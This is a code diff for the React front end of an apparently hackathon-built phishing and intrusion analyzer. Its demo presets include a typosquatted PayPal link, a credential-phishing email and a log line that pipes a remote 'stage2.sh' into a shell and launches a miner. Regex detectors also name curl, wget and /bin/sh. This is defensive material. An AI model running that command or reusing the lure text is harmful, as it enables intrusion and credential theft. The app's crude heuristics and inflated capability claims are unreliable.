@@ -1,193 +1,848 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
 import { createRoot } from 'react-dom/client'
+import confetti from 'canvas-confetti'
 import './styles.css'
 
 const API_BASE = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000'
 
-const examples = {
-  url: 'https://secure-payments.example-login.net/verify?session=expired',
-  email: 'From: PayPal Security <support@paypaI-account.co>\nSubject: Urgent: account limitation\n\nYour account is restricted. Verify your password within 30 minutes to restore access: http://paypaI-account.co/restore',
-  log: 'Oct 26 09:18:42 sshd[2115]: Failed password for invalid user admin from 185.220.101.8 port 53112 ssh2\nOct 26 09:18:46 sshd[2118]: Failed password for invalid user root from 185.220.101.8 port 53305 ssh2'
-}
+// ─── Hackathon Judge Chaos Presets ───────────────────────────────────────────
+const CHAOS_PRESETS = [
+  {
+    id: 'typosquat-url',
+    type: 'url',
+    badge: 'HOMOGRAPH PHISH',
+    badgeClass: 'badge-red',
+    title: 'Zero-Day Typosquat Link',
+    desc: 'Capital "I" homoglyph in PayPal domain with fake session token query',
+    payload: 'https://secure-payments.paypaI-security.top/verify?session=expired&redirect=auth_token'
+  },
+  {
+    id: 'hr-payroll-email',
+    type: 'email',
+    badge: 'BEC SCAM',
+    badgeClass: 'badge-amber',
+    title: 'Urgent HR Payroll Scam',
+    desc: 'Corporate executive impersonation with 30-min ultimatum and credential lure',
+    payload: `From: PayPal Corporate Security <support@paypaI-account.co>
+Reply-To: security-triage@disposable-mail.xyz
+Subject: URGENT: Account Limitation Notice - Action Required Within 30 Minutes
+
+Your executive access has been temporarily restricted due to unauthorized login attempts.
+To restore payroll privileges, immediately verify your account credentials:
+http://paypaI-account.co/restore-credentials.php
+
+Failure to verify within 30 minutes will trigger permanent security lock.`
+  },
+  {
+    id: 'ssh-brute-log',
+    type: 'log',
+    badge: 'BRUTE FORCE + C2',
+    badgeClass: 'badge-red',
+    title: 'APT SSH Storm + Malware Drop',
+    desc: 'Rapid multi-account password guessing followed by curl / stage2 payload execution',
+    payload: `Oct 30 04:12:01 sshd[18402]: Failed password for invalid user admin from 185.220.101.8 port 51230 ssh2
+Oct 30 04:12:03 sshd[18404]: Failed password for invalid user root from 185.220.101.8 port 51234 ssh2
+Oct 30 04:12:06 sshd[18409]: Failed password for invalid user devops from 185.220.101.8 port 51240 ssh2
+Oct 30 04:12:09 bash[18415]: Accepted password for deploy from 185.220.101.8 port 51250 ssh2
+Oct 30 04:12:11 bash[18420]: curl -s http://185.220.101.8/stage2.sh | /bin/sh
+Oct 30 04:12:12 bash[18422]: chmod +x /tmp/.miner && /tmp/.miner --background`
+  },
+  {
+    id: 'clean-oauth-url',
+    type: 'url',
+    badge: 'VERIFIED CLEAN',
+    badgeClass: 'badge-cyan',
+    title: 'Legitimate OAuth Callback',
+    desc: 'Official GitHub developer authentication callback baseline',
+    payload: 'https://github.com/login/oauth/authorize?client_id=Iv1.879201a098bc&scope=read:user'
+  }
+]
 
 const typeInfo = {
-  url: { label: 'Suspicious URL', hint: 'Paste the complete address you received.', icon: 'link' },
-  email: { label: 'Email message', hint: 'Include sender, subject, and the relevant content.', icon: 'mail' },
-  log: { label: 'Security log', hint: 'Paste a short event or authentication snippet.', icon: 'terminal' }
+  url: {
+    label: 'Suspicious URL',
+    hint: 'Deconstruct links, shorteners, homoglyphs, and punycode mutations.',
+    tag: 'NETWORK VECTOR'
+  },
+  email: {
+    label: 'Email Message',
+    hint: 'Dissect headers, urgency psychological triggers, and fake Reply-To routings.',
+    tag: 'SOCIAL ENGINEERING'
+  },
+  log: {
+    label: 'Security Log',
+    hint: 'Correlate auth anomalies, brute-force bursts, and shell commands.',
+    tag: 'INTRUSION TELEMETRY'
+  }
 }
 
 const guideSteps = [
-  ['01', 'Make the core flow work', 'One input → one result → clear next action. Nothing else outranks this.'],
-  ['02', 'Protect the trust boundary', 'Keep keys server-side. Never store raw submissions by default.'],
-  ['03', 'Design every state', 'Empty, loading, result, error, keyboard, and mobile states must feel intentional.'],
-  ['04', 'Rehearse the failure path', 'Demo fallback and sample content must work without a network connection.']
+  ['01', 'Dual-Engine Resiliency', 'Zero downtime: seamless fallback to deterministic heuristic engine if external AI fails.'],
+  ['02', 'Zero-Trust Data Vault', 'Strict zero-retention: raw submissions are never stored, logged, or indexed.'],
+  ['03', 'Mathematical Forensics', 'Deconstructs Shannon entropy, MITRE ATT&CK techniques, and homoglyphs.'],
+  ['04', 'Automated Defense Rules', 'Instantly exports firewall drop rules, WAF signatures, and incident runbooks.']
 ]
 
-// Terminal scan lines cycle through these
 const SCAN_LINES = [
-  '> Initializing threat analysis engine...',
-  '> Parsing input structure...',
-  '> Checking against known threat signatures...',
-  '> Analyzing linguistic patterns...',
-  '> Cross-referencing domain reputation...',
-  '> Scanning for obfuscation techniques...',
-  '> Evaluating credential harvest indicators...',
-  '> Running heuristic risk scoring...',
-  '> Correlating behavioral signals...',
-  '> Finalizing threat assessment...',
+  '⚡ [CYBER-CORE] Initializing telemetry inspection matrix...',
+  '🛰️ [DNS-RADAR] Resolving canonical routing & subdomain depth...',
+  '🔬 [ENTROPY] Computing Shannon entropy & character distribution...',
+  '👁️ [HOMOGRAPH] Scanning visual glyph homoglyphs & punycode mutations...',
+  '🛡️ [HEURISTICS] Evaluating against 40+ deterministic threat signatures...',
+  '🧠 [CO-PILOT] Synthesizing context with zero-retention privacy wrapper...',
+  '🎯 [MITRE] Correlating indicators to ATT&CK tactical matrices...',
+  '⚡ [DEFENSE] Generating incident response & automated firewall rules...'
 ]
 
-function Icon({ name, size = 18, stroke = 1.8 }) {
-  const paths = {
-    grid: <><rect x="3" y="3" width="7" height="7" rx="1" /><rect x="14" y="3" width="7" height="7" rx="1" /><rect x="3" y="14" width="7" height="7" rx="1" /><rect x="14" y="14" width="7" height="7" rx="1" /></>,
-    scan: <><path d="M4 7V5a1 1 0 0 1 1-1h2M17 4h2a1 1 0 0 1 1 1v2M20 17v2a1 1 0 0 1-1 1h-2M7 20H5a1 1 0 0 1-1-1v-2" /><path d="M8 12h8M12 8v8" /></>,
-    history: <><path d="M3 12a9 9 0 1 0 3-6.7" /><path d="M3 4v5h5M12 7v5l3 2" /></>,
-    book: <><path d="M4 5.5A2.5 2.5 0 0 1 6.5 3H20v17H6.5A2.5 2.5 0 0 0 4 22.5z" /><path d="M4 5.5v15M8 7h8" /></>,
-    gear: <><circle cx="12" cy="12" r="3" /><path d="M19.4 15a1.7 1.7 0 0 0 .34 1.88l.06.06-2.12 2.12-.06-.06a1.7 1.7 0 0 0-1.88-.34 1.7 1.7 0 0 0-1 1.55v.09h-3v-.09a1.7 1.7 0 0 0-1-1.55 1.7 1.7 0 0 0-1.88.34l-.06.06-2.12-2.12.06-.06A1.7 1.7 0 0 0 7 15a1.7 1.7 0 0 0-1.55-1H5.4v-3h.08A1.7 1.7 0 0 0 7 10a1.7 1.7 0 0 0-.34-1.88L6.6 8.06 8.72 5.94l.06.06A1.7 1.7 0 0 0 10.66 6 1.7 1.7 0 0 0 11.66 4.45v-.08h3v.08A1.7 1.7 0 0 0 15.66 6a1.7 1.7 0 0 0 1.88-.34l.06-.06 2.12 2.12-.06.06A1.7 1.7 0 0 0 19.32 10a1.7 1.7 0 0 0 1.55 1h.08v3h-.08A1.7 1.7 0 0 0 19.4 15z" /></>,
-    link: <><path d="M10 13a5 5 0 0 0 7.1.1l2-2a5 5 0 0 0-7.1-7.1l-1.1 1.1" /><path d="M14 11a5 5 0 0 0-7.1-.1l-2 2A5 5 0 0 0 12 20l1.1-1.1" /></>,
-    mail: <><rect x="3" y="5" width="18" height="14" rx="2" /><path d="m3 7 9 6 9-6" /></>,
-    terminal: <><rect x="3" y="4" width="18" height="16" rx="2" /><path d="m7 9 3 3-3 3M13 15h4" /></>,
-    shield: <path d="M12 3 20 6v5c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-3z" />,
-    spark: <path d="m12 3 1.9 5.1L19 10l-5.1 1.9L12 17l-1.9-5.1L5 10l5.1-1.9L12 3zM19 16l.8 2.2L22 19l-2.2.8L19 22l-.8-2.2L16 19l2.2-.8L19 16z" />,
-    arrow: <><path d="M5 12h14M13 6l6 6-6 6" /></>,
-    plus: <><path d="M12 5v14M5 12h14" /></>,
-    close: <><path d="m6 6 12 12M18 6 6 18" /></>,
-    copy: <><rect x="9" y="9" width="11" height="11" rx="2" /><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" /></>,
-    check: <path d="m5 12 4 4L19 6" />,
-    chevron: <path d="m9 18 6-6-6-6" />,
-    external: <><path d="M14 3h7v7M10 14 21 3M21 14v5a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5" /></>,
-    info: <><circle cx="12" cy="12" r="9" /><path d="M12 11v5M12 8h.01" /></>,
-    trash: <><path d="M3 6h18M8 6V4h8v2M6 6l1 15h10l1-15M10 10v7M14 10v7" /></>,
-    send: <><path d="m22 2-7 20-4-9-9-4Z" /><path d="M22 2 11 13" /></>,
-    menu: <><path d="M4 6h16M4 12h16M4 18h16" /></>,
-    x: <><path d="m6 6 12 12M18 6 6 18" /></>,
+// ─── Tactical Web Audio Synthesizer ───────────────────────────────────────────
+class TactileAudioEngine {
+  constructor() {
+    this.ctx = null
+    this.enabled = true
   }
-  return <svg aria-hidden="true" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={stroke} strokeLinecap="round" strokeLinejoin="round">{paths[name]}</svg>
+
+  init() {
+    if (!this.ctx && typeof window !== 'undefined') {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext
+      if (AudioCtx) this.ctx = new AudioCtx()
+    }
+    if (this.ctx && this.ctx.state === 'suspended') {
+      this.ctx.resume()
+    }
+  }
+
+  play(type) {
+    if (!this.enabled) return
+    try {
+      this.init()
+      if (!this.ctx) return
+      const now = this.ctx.currentTime
+
+      if (type === 'click') {
+        const osc = this.ctx.createOscillator()
+        const gain = this.ctx.createGain()
+        osc.type = 'sine'
+        osc.frequency.setValueAtTime(1400, now)
+        osc.frequency.exponentialRampToValueAtTime(300, now + 0.03)
+        gain.gain.setValueAtTime(0.04, now)
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.03)
+        osc.connect(gain)
+        gain.connect(this.ctx.destination)
+        osc.start(now)
+        osc.stop(now + 0.03)
+      } else if (type === 'scan') {
+        const osc = this.ctx.createOscillator()
+        const gain = this.ctx.createGain()
+        osc.type = 'triangle'
+        osc.frequency.setValueAtTime(260, now)
+        osc.frequency.linearRampToValueAtTime(1100, now + 0.25)
+        gain.gain.setValueAtTime(0.06, now)
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25)
+        osc.connect(gain)
+        gain.connect(this.ctx.destination)
+        osc.start(now)
+        osc.stop(now + 0.25)
+      } else if (type === 'safe') {
+        // Harmonic acoustic chord
+        ;[523.25, 659.25, 783.99].forEach((freq, idx) => {
+          const osc = this.ctx.createOscillator()
+          const gain = this.ctx.createGain()
+          osc.type = 'sine'
+          const start = now + idx * 0.06
+          osc.frequency.setValueAtTime(freq, start)
+          gain.gain.setValueAtTime(0.07, start)
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2)
+          osc.connect(gain)
+          gain.connect(this.ctx.destination)
+          osc.start(start)
+          osc.stop(start + 0.2)
+        })
+      } else if (type === 'danger') {
+        // Warning alert tone
+        ;[280, 290].forEach(freq => {
+          const osc = this.ctx.createOscillator()
+          const gain = this.ctx.createGain()
+          osc.type = 'sawtooth'
+          osc.frequency.setValueAtTime(freq, now)
+          osc.frequency.linearRampToValueAtTime(freq * 0.75, now + 0.24)
+          gain.gain.setValueAtTime(0.06, now)
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.24)
+          osc.connect(gain)
+          gain.connect(this.ctx.destination)
+          osc.start(now)
+          osc.stop(now + 0.24)
+        })
+      }
+    } catch {
+      // Audio policy safe
+    }
+  }
 }
 
-function RiskBadge({ risk }) {
-  const title = risk === 'high' ? 'High risk' : risk === 'medium' ? 'Needs review' : 'Low risk'
-  return <span className={`risk-badge ${risk}`}><span className="risk-dot" />{title}</span>
+const audio = new TactileAudioEngine()
+
+// ─── Mathematical Shannon Entropy Calculation ─────────────────────────────────
+function calculateShannonEntropy(str) {
+  if (!str) return 0
+  const clean = str.toLowerCase().replace(/[^a-z0-9]/g, '')
+  if (!clean.length) return 0
+  const freqs = {}
+  for (const ch of clean) freqs[ch] = (freqs[ch] || 0) + 1
+  let entropy = 0
+  for (const ch in freqs) {
+    const p = freqs[ch] / clean.length
+    entropy -= p * Math.log2(p)
+  }
+  return Number(entropy.toFixed(2))
 }
 
-// Animated threat meter component
-function ThreatMeter({ risk, confidence }) {
-  const pct = Math.max(8, Math.min(98, confidence || 65))
-  const color = risk === 'high' ? '#ef4444' : risk === 'medium' ? '#f59e0b' : '#00ff87'
-  const label = risk === 'high' ? 'Critical' : risk === 'medium' ? 'Elevated' : 'Nominal'
-  return (
-    <div className="threat-meter" aria-label={`Threat level: ${label}`}>
-      <div className="threat-meter-header">
-        <span className="threat-meter-label">Threat Level</span>
-        <span className="threat-meter-value" style={{ color }}>{label}</span>
-      </div>
-      <div className="threat-meter-track" role="progressbar" aria-valuenow={pct} aria-valuemin={0} aria-valuemax={100}>
-        <div
-          className="threat-meter-fill"
-          style={{ width: `${pct}%`, background: `linear-gradient(90deg, ${color}88, ${color})` }}
-        />
-        <div className="threat-meter-glow" style={{ left: `${pct}%`, boxShadow: `0 0 12px 4px ${color}66`, background: color }} />
-      </div>
-      <div className="threat-meter-footer">
-        <span>0%</span>
-        <span>{pct}% confidence</span>
-        <span>100%</span>
-      </div>
-    </div>
-  )
-}
-
-// Confidence bar component
-function ConfidenceBar({ percent, risk }) {
-  const color = risk === 'high' ? '#ef4444' : risk === 'medium' ? '#f59e0b' : '#00ff87'
-  return (
-    <div className="confidence-bar-wrap">
-      <div className="confidence-bar-label">
-        <span>Confidence</span>
-        <span style={{ color }}>{percent}%</span>
-      </div>
-      <div className="confidence-bar-track">
-        <div
-          className="confidence-bar-fill"
-          style={{ width: `${percent}%`, background: `linear-gradient(90deg, ${color}66, ${color})` }}
-        />
-      </div>
-    </div>
-  )
-}
-
-// Toast notification
-function Toast({ message, visible }) {
-  return (
-    <div className={`toast ${visible ? 'toast-visible' : ''}`} role="status" aria-live="polite">
-      <Icon name="check" size={14} />
-      {message}
-    </div>
-  )
-}
-
-// Terminal scan animation
-function TerminalScan() {
-  const [lines, setLines] = useState([SCAN_LINES[0]])
-  const [cursor, setCursor] = useState(true)
+// ─── Mind-Blowing Feature 1: Dynamic Threat Particle & Ink Canvas ──────────────
+function ThreatParticleCanvas({ mode = 'idle', enabled = true, theme = 'parchment' }) {
+  const canvasRef = useRef(null)
 
   useEffect(() => {
-    let lineIndex = 1
-    const lineTimer = setInterval(() => {
-      if (lineIndex < SCAN_LINES.length) {
-        setLines(prev => [...prev, SCAN_LINES[lineIndex]])
-        lineIndex++
+    if (!enabled) return
+    const canvas = canvasRef.current
+    if (!canvas) return
+    const ctx = canvas.getContext('2d')
+    let animationFrameId
+    let width = (canvas.width = window.innerWidth)
+    let height = (canvas.height = window.innerHeight)
+
+    const handleResize = () => {
+      if (!canvas) return
+      width = canvas.width = window.innerWidth
+      height = canvas.height = window.innerHeight
+    }
+    window.addEventListener('resize', handleResize)
+
+    const mouse = { x: width / 2, y: height / 2, active: false }
+    const handleMouseMove = e => {
+      mouse.x = e.clientX
+      mouse.y = e.clientY
+      mouse.active = true
+    }
+    const handleMouseLeave = () => {
+      mouse.active = false
+    }
+    window.addEventListener('mousemove', handleMouseMove)
+    window.addEventListener('mouseleave', handleMouseLeave)
+
+    // Particle count
+    const PARTICLE_COUNT = 90
+    const particles = []
+
+    for (let i = 0; i < PARTICLE_COUNT; i++) {
+      particles.push({
+        x: Math.random() * width,
+        y: Math.random() * height,
+        vx: (Math.random() - 0.5) * 0.4,
+        vy: (Math.random() - 0.5) * 0.4,
+        radius: Math.random() * 1.6 + 0.8,
+        baseRadius: Math.random() * 1.6 + 0.8,
+        angle: Math.random() * Math.PI * 2,
+        distFromCenter: Math.random() * (Math.min(width, height) * 0.45),
+        pulse: Math.random()
+      })
+    }
+
+    let frame = 0
+    const render = () => {
+      frame++
+      ctx.clearRect(0, 0, width, height)
+
+      const centerX = width / 2
+      const centerY = height / 2
+      const isDark = theme === 'blueprint'
+
+      // Color palette based on threat mode
+      let dotColor = isDark ? 'rgba(200, 215, 235, 0.35)' : 'rgba(30, 35, 45, 0.28)'
+      let lineColor = isDark ? 'rgba(56, 189, 248, 0.08)' : 'rgba(217, 45, 32, 0.06)'
+      let lineDistMax = 110
+
+      if (mode === 'danger') {
+        dotColor = isDark ? 'rgba(244, 63, 94, 0.75)' : 'rgba(217, 45, 32, 0.65)'
+        lineColor = isDark ? 'rgba(244, 63, 94, 0.22)' : 'rgba(217, 45, 32, 0.18)'
+        lineDistMax = 150
+      } else if (mode === 'safe') {
+        dotColor = isDark ? 'rgba(16, 185, 129, 0.7)' : 'rgba(15, 118, 110, 0.6)'
+        lineColor = isDark ? 'rgba(16, 185, 129, 0.2)' : 'rgba(15, 118, 110, 0.15)'
+        lineDistMax = 120
+      } else if (mode === 'scanning') {
+        dotColor = isDark ? 'rgba(56, 189, 248, 0.7)' : 'rgba(17, 18, 21, 0.55)'
+        lineColor = isDark ? 'rgba(56, 189, 248, 0.25)' : 'rgba(17, 18, 21, 0.18)'
+        lineDistMax = 130
       }
-    }, 600)
-    const cursorTimer = setInterval(() => setCursor(c => !c), 530)
-    return () => { clearInterval(lineTimer); clearInterval(cursorTimer) }
-  }, [])
+
+      for (let i = 0; i < particles.length; i++) {
+        const p = particles[i]
+
+        if (mode === 'scanning') {
+          // Vortex spiral towards center
+          p.angle += 0.02
+          p.distFromCenter -= 0.5
+          if (p.distFromCenter < 20) {
+            p.distFromCenter = Math.min(width, height) * 0.45
+          }
+          p.x = centerX + Math.cos(p.angle) * p.distFromCenter
+          p.y = centerY + Math.sin(p.angle) * p.distFromCenter
+        } else if (mode === 'danger') {
+          // Chaotic jitter + outward repelling bursts
+          p.x += p.vx * 2.8 + (Math.random() - 0.5) * 1.5
+          p.y += p.vy * 2.8 + (Math.random() - 0.5) * 1.5
+        } else if (mode === 'safe') {
+          // Gentle concentric harmony
+          p.x += p.vx * 0.6
+          p.y += p.vy * 0.6
+        } else {
+          // Ambient fluid ink drift
+          p.x += p.vx
+          p.y += p.vy
+        }
+
+        // Mouse displacement
+        if (mouse.active) {
+          const dx = p.x - mouse.x
+          const dy = p.y - mouse.y
+          const dist = Math.sqrt(dx * dx + dy * dy)
+          if (dist < 120) {
+            const force = (120 - dist) / 120
+            p.x += (dx / dist) * force * 3
+            p.y += (dy / dist) * force * 3
+          }
+        }
+
+        // Boundary wrap
+        if (p.x < 0) p.x = width
+        if (p.x > width) p.x = 0
+        if (p.y < 0) p.y = height
+        if (p.y > height) p.y = 0
+
+        // Draw particle
+        ctx.beginPath()
+        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2)
+        ctx.fillStyle = dotColor
+        ctx.fill()
+
+        // Draw connecting hairline filaments
+        for (let j = i + 1; j < particles.length; j++) {
+          const p2 = particles[j]
+          const dx = p.x - p2.x
+          const dy = p.y - p2.y
+          const dist = Math.sqrt(dx * dx + dy * dy)
+
+          if (dist < lineDistMax) {
+            ctx.beginPath()
+            ctx.moveTo(p.x, p.y)
+            ctx.lineTo(p2.x, p2.y)
+            ctx.strokeStyle = lineColor
+            ctx.lineWidth = 0.65
+            ctx.stroke()
+          }
+        }
+      }
+
+      animationFrameId = requestAnimationFrame(render)
+    }
+
+    render()
+
+    return () => {
+      cancelAnimationFrame(animationFrameId)
+      window.removeEventListener('resize', handleResize)
+      window.removeEventListener('mousemove', handleMouseMove)
+      window.removeEventListener('mouseleave', handleMouseLeave)
+    }
+  }, [mode, enabled, theme])
+
+  if (!enabled) return null
+  return <canvas id="threat-particle-canvas" ref={canvasRef} aria-hidden="true" />
+}
+
+// ─── Mind-Blowing Feature 2: Threat DNA Genome Sequencer ───────────────────────
+function ThreatDNASquencer({ text, inputType, onSelectGene }) {
+  const codons = useMemo(() => {
+    if (!text.trim()) {
+      return [
+        { label: 'GENE // 01', name: 'WAITING_PAYLOAD', status: 'clean', desc: 'No input loaded' },
+        { label: 'GENE // 02', name: 'ENTROPY_NULL', status: 'clean', desc: 'Entropy 0.00 bits' },
+        { label: 'GENE // 03', name: 'HEURISTIC_STANDBY', status: 'clean', desc: '40+ detectors idle' }
+      ]
+    }
+
+    const entropy = calculateShannonEntropy(text)
+    const list = []
+
+    if (inputType === 'url') {
+      const isHttps = text.startsWith('https://')
+      list.push({
+        label: 'CODON // SCHEME',
+        name: isHttps ? 'TLS_ENCRYPTED' : 'PLAINTEXT_HTTP',
+        status: isHttps ? 'clean' : 'danger',
+        desc: isHttps ? 'Transport encrypted' : 'Cleartext insecure vector'
+      })
+
+      const hasHomoglyph = /[il1]{2,}|[a-z]+-[a-z]+|xn--/i.test(text)
+      list.push({
+        label: 'CODON // GLYPH',
+        name: hasHomoglyph ? 'HOMOGLYPH_MUTATION' : 'CLEAN_ALPHABET',
+        status: hasHomoglyph ? 'danger' : 'clean',
+        desc: hasHomoglyph ? 'Visual character spoofing detected' : 'Standard Latin alphabet'
+      })
+
+      const isShortener = /bit\.ly|t\.co|tinyurl|is\.gd|cutt\.ly|rb\.gy/i.test(text)
+      list.push({
+        label: 'CODON // ROUTING',
+        name: isShortener ? 'REDIRECT_MASK' : 'DIRECT_FQDN',
+        status: isShortener ? 'warn' : 'clean',
+        desc: isShortener ? 'URL redirection shortener masked' : 'Direct domain target'
+      })
+
+      list.push({
+        label: 'CODON // ENTROPY',
+        name: `H=${entropy}_BITS`,
+        status: entropy > 3.4 ? 'danger' : 'clean',
+        desc: entropy > 3.4 ? 'High Shannon entropy (DGA or encoded)' : 'Standard lexical entropy'
+      })
+    } else if (inputType === 'email') {
+      const hasUrgency = /urgent|immediate|30 minute|restricted|payroll/i.test(text)
+      list.push({
+        label: 'CODON // PSYCH',
+        name: hasUrgency ? 'URGENCY_TRIGGER' : 'NEUTRAL_TONE',
+        status: hasUrgency ? 'danger' : 'clean',
+        desc: hasUrgency ? 'High-pressure psychological trigger' : 'No coercive deadlines'
+      })
+
+      const hasReplyMismatch = /Reply-To/i.test(text)
+      list.push({
+        label: 'CODON // HEADER',
+        name: hasReplyMismatch ? 'REPLY_TO_DELTA' : 'STANDARD_HEADER',
+        status: hasReplyMismatch ? 'warn' : 'clean',
+        desc: hasReplyMismatch ? 'Separate Reply-To routing present' : 'Symmetric sender routing'
+      })
+
+      list.push({
+        label: 'CODON // ENTROPY',
+        name: `H=${entropy}_BITS`,
+        status: entropy > 3.5 ? 'warn' : 'clean',
+        desc: 'Header and content lexical distribution'
+      })
+    } else {
+      const hasTools = /curl|wget|chmod|\/bin\/sh|miner/i.test(text)
+      list.push({
+        label: 'CODON // EXPLOIT',
+        name: hasTools ? 'C2_PAYLOAD_DROP' : 'AUTH_STREAM',
+        status: hasTools ? 'danger' : 'clean',
+        desc: hasTools ? 'Remote payload dropper executed' : 'Standard log authentication'
+      })
+
+      const failedCount = (text.match(/failed password|invalid user/gi) || []).length
+      list.push({
+        label: 'CODON // BRUTE',
+        name: failedCount > 2 ? `BURST_${failedCount}_ATTEMPTS` : 'NOMINAL_AUTH',
+        status: failedCount > 2 ? 'danger' : 'clean',
+        desc: failedCount > 2 ? 'Automated credential stuffing stream' : 'Single or nominal auth event'
+      })
+
+      list.push({
+        label: 'CODON // MITRE',
+        name: hasTools ? 'T1059_EXECUTION' : 'T1110_BRUTE_FORCE',
+        status: hasTools ? 'danger' : 'warn',
+        desc: 'Mapped ATT&CK tactic category'
+      })
+    }
+
+    return list
+  }, [text, inputType])
 
   return (
-    <div className="terminal-scan" aria-live="polite" aria-label="Scanning in progress">
-      <div className="terminal-header">
-        <span className="terminal-dot red" />
-        <span className="terminal-dot yellow" />
-        <span className="terminal-dot green" />
-        <span className="terminal-title">cyberlens — threat-scanner</span>
+    <aside className="threat-dna-aside" aria-label="Dynamic Threat DNA Sequencer">
+      <div className="dna-aside-head">
+        <h3>Payload Threat DNA Strand</h3>
+        <span className="dna-aside-badge">LIVE GENOME</span>
       </div>
-      <div className="terminal-body">
-        {lines.map((line, i) => (
-          <div key={i} className="terminal-line">
-            <span className="terminal-prompt">$</span>
-            <span>{line}</span>
+      <p className="dna-aside-desc">
+        Mathematical codon mapping deconstructing input into forensic genetic markers:
+      </p>
+
+      <div className="threat-dna-bar">
+        <div className="dna-strand-track" role="region" aria-label="Genome codons">
+          {codons.map((codon, idx) => (
+            <div
+              key={idx}
+              className={`dna-segment seg-${codon.status}`}
+              onClick={() => onSelectGene?.(codon)}
+              title={`${codon.label}: ${codon.name} — ${codon.desc}`}
+            >
+              <span>{codon.name.slice(0, 8)}</span>
+            </div>
+          ))}
+        </div>
+        <div className="dna-legend">
+          <span>0x000 BASE</span>
+          <span>{codons.length} GENOMIC CODONS</span>
+          <span>0xFFF VECTOR</span>
+        </div>
+      </div>
+    </aside>
+  )
+}
+
+// ─── Minimalist Architectural Lens Vector SVG ─────────────────────────────────
+function ArchitecturalLensMark({ size = 28 }) {
+  return (
+    <svg
+      width={size}
+      height={size}
+      viewBox="0 0 32 32"
+      fill="none"
+      stroke="currentColor"
+      strokeWidth="1.6"
+      strokeLinecap="square"
+      strokeLinejoin="miter"
+      className="pen-lens-logo"
+      aria-hidden="true"
+    >
+      {/* Precision Drafting Optical Aperture */}
+      <circle cx="16" cy="16" r="13" stroke="currentColor" strokeWidth="1.2" strokeDasharray="1 3" />
+      <circle cx="16" cy="16" r="9" stroke="currentColor" strokeWidth="1.4" />
+      <polygon points="16,8 23,16 16,24 9,16" stroke="var(--accent)" strokeWidth="1.4" fill="none" />
+      <line x1="16" y1="3" x2="16" y2="7" stroke="currentColor" />
+      <line x1="16" y1="25" x2="16" y2="29" stroke="currentColor" />
+      <line x1="3" y1="16" x2="7" y2="16" stroke="currentColor" />
+      <line x1="25" y1="16" x2="29" y2="16" stroke="currentColor" />
+      <circle cx="16" cy="16" r="2" fill="var(--accent)" stroke="none" />
+    </svg>
+  )
+}
+
+// ─── Forensic Deep-Dive Anatomy Component ─────────────────────────────────────
+function ForensicAnatomyView({ text, inputType }) {
+  const entropy = useMemo(() => calculateShannonEntropy(text), [text])
+
+  const urlParts = useMemo(() => {
+    if (inputType !== 'url') return null
+    try {
+      const candidate = text.trim().split(/\s+/)[0]
+      const url = new URL(candidate.includes('://') ? candidate : `http://${candidate}`)
+      const hostParts = url.hostname.split('.')
+      const subdomains = hostParts.slice(0, -2).join('.')
+      const rootDomain = hostParts.slice(-2).join('.')
+      const hasHomoglyph = /[il1]{2,}|[a-z]+-[a-z]+|xn--/i.test(url.hostname)
+      return {
+        protocol: url.protocol.replace(':', ''),
+        hostname: url.hostname,
+        subdomains: subdomains || 'None (Direct Apex)',
+        rootDomain,
+        pathname: url.pathname,
+        hasHomoglyph
+      }
+    } catch {
+      return null
+    }
+  }, [text, inputType])
+
+  const emailTriggers = useMemo(() => {
+    if (inputType !== 'email') return null
+    const words = ['urgent', 'immediately', 'verify', 'password', 'restricted', 'suspended', 'invoice', 'payroll']
+    const found = words.filter(w => text.toLowerCase().includes(w))
+    const fromMatch = text.match(/From:\s*([^<\n]+)?(?:<([^>]+)>)?/i)
+    const replyMatch = text.match(/Reply-To:\s*([^<\n]+)?(?:<([^>]+)>)?/i)
+    return {
+      urgencyWords: found,
+      from: fromMatch ? (fromMatch[2] || fromMatch[1] || '').trim() : 'Unspecified',
+      replyTo: replyMatch ? (replyMatch[2] || replyMatch[1] || '').trim() : 'Matches Sender'
+    }
+  }, [text, inputType])
+
+  const logIndicators = useMemo(() => {
+    if (inputType !== 'log') return null
+    const ips = Array.from(new Set(text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []))
+    const failedCount = (text.match(/failed password|invalid user/gi) || []).length
+    const tools = ['curl', 'wget', 'chmod', '/bin/sh'].filter(t => text.toLowerCase().includes(t))
+    return { ips, failedCount, tools }
+  }, [text, inputType])
+
+  return (
+    <div className="forensic-lab-wrap">
+      <div className="anatomy-grid">
+        <div className="anatomy-cell">
+          <span className="cell-label">SHANNON ENTROPY COEFFICIENT</span>
+          <span className={`cell-value ${entropy > 3.4 ? 'danger' : 'safe'}`}>
+            {entropy} bits/char {entropy > 3.4 ? '(High DGA / Obfuscation)' : '(Standard)'}
+          </span>
+        </div>
+
+        {inputType === 'url' && urlParts && (
+          <>
+            <div className="anatomy-cell">
+              <span className="cell-label">SCHEME TRANSPORT</span>
+              <span className={`cell-value ${urlParts.protocol === 'https' ? 'safe' : 'danger'}`}>
+                {urlParts.protocol.toUpperCase()} {urlParts.protocol === 'https' ? '✓ TLS Encrypted' : '⚠ Cleartext Insecure'}
+              </span>
+            </div>
+            <div className="anatomy-cell">
+              <span className="cell-label">CANONICAL APEX HOST</span>
+              <span className="cell-value">{urlParts.rootDomain}</span>
+            </div>
+            <div className="anatomy-cell">
+              <span className="cell-label">HOMOGLYPH CHECK</span>
+              <span className={`cell-value ${urlParts.hasHomoglyph ? 'danger' : 'safe'}`}>
+                {urlParts.hasHomoglyph ? '⚠️ Deceptive Lookalike Glyphs' : 'Clean Glyph Profile'}
+              </span>
+            </div>
+          </>
+        )}
+
+        {inputType === 'email' && emailTriggers && (
+          <>
+            <div className="anatomy-cell">
+              <span className="cell-label">DECLARED SENDER</span>
+              <span className="cell-value">{emailTriggers.from}</span>
+            </div>
+            <div className="anatomy-cell">
